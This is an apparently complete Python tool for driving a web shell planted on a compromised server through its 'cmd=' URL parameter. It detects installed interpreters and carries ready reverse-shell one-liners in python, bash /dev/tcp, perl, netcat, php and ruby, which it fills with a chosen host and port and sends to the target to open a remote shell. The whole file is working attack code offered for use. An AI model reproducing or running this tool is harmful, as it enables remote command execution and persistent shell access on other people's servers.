#!/usr/bin/env python3
#Import modules
from urllib3 import PoolManager
from argparse import ArgumentParser
from re import sub
from urllib import parse
def installer(program):
  try:
    from pip import main as pipmain
  except:
    print("[*]Pip not installed")
    exit()
  pipmain(['install', program])
  exit()

try:
  from termcolor import colored as color
except:
  installer("termcolor")

splash=  "   _____ __  __________    __ \n"
splash+= "  / ___// / / / ____/ /   / / \n"
splash+= "  \__ \/ /_/ / __/ / /   / /  \n"
splash+= " ___/ / __  / /___/ /___/ /___\n"
splash+= "/____/_/ /_/_____/_____/_____/\n"
options = {
  'help': 'Display options',
  'revshell': 'Kickoff revshell. Supported Languages: nc, python, bash, perl, ruby, php. IE: revshell python 127.0.0.1 4444.',
  'tools': 'Retrieve list of installed tools.',
  'exit': 'exit program',
  'quit': 'exit program'
}
option_prompt = ('\n'.join(str("%-8s -> %s" % (v,options[v])) for v in options.keys()))
print(color(splash+"\n"+option_prompt, "green"))

#Constants---------------------------------------------------------
http = PoolManager()
parser = ArgumentParser(description="A simple shell interactive program.")
parser.add_argument('-u', '--url', type=str, required=False, help="full url IE: http://domain/uploads/shell.gif.php")
args = parser.parse_args()
if not args.url:
  url = input("Input URL: ")
else:
  url = args.url
if not url:
  exit()
#Try file
try:
  r = http.request("GET", url)
  if not (r.status == 200 or r.status == 302):
    print("[*] Possible connection issue?")
  if not url.endswith("?"):
    url = url + "?"
  if not url.endswith("cmd="):
    url = url + "cmd="
except:
  print("Unable to contact specified url")
  exit()

#--------------------------------------------------------------------------------------------------------
#functions
def get_tools(url):
  if not url:
    exit()
  possible = ("nc", "python", "bash", "perl", "ruby", "php")
  tools = []
  for program in possible:
    uri = url+"which %s" % program
    r = http.request("GET", uri)
    if program in r.data.decode().splitlines()[1]:
      tools.append(program)
  return tools

def get_cmd(cmd):
  lang = {
    'python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call("/bin/sh")\'',
    'bash': 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1',
    'perl': 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
    'nc': 'nc -nv LHOST LPORT -e /bin/bash', #only works with newer nc version
    'php': 'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
    'ruby': 'ruby -rsocket -e \'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i")\''
  }
  if cmd == "exit":
    exit()
  elif cmd == "quit":
    exit()
  elif cmd == "help":
    print(color("\n"+option_prompt+"\n", "green"))
    return ''
  elif cmd == "tools":
    print(color(tools, "green"))
    return ''
  elif not cmd:
    return ''
  elif cmd.split()[0] == "revshell":
    if cmd.split()[1] not in lang.keys():
      print("inproper sytax")
      return ''
    else:
      tmp = sub("LHOST", cmd.split()[2], lang[(cmd.split()[1])])
      tmp = sub("LPORT", cmd.split()[3], tmp)
      print(tmp)
      return parse.quote(tmp) # to urlencode on send.

  else:
    return parse.quote(cmd)


tools = get_tools(url)
while True:
  cmd = input(color(" $ ","blue"))
  cmd = get_cmd(cmd)
  if cmd:
    uri = url+cmd
    r = http.request("GET", uri)
    l = r.data.decode().splitlines()[-1] + "\n"
    txt = l + '\n'.join(str(v) for v in r.data.decode().splitlines()[1:])
    print(color(txt, "green"))
  else:
    pass
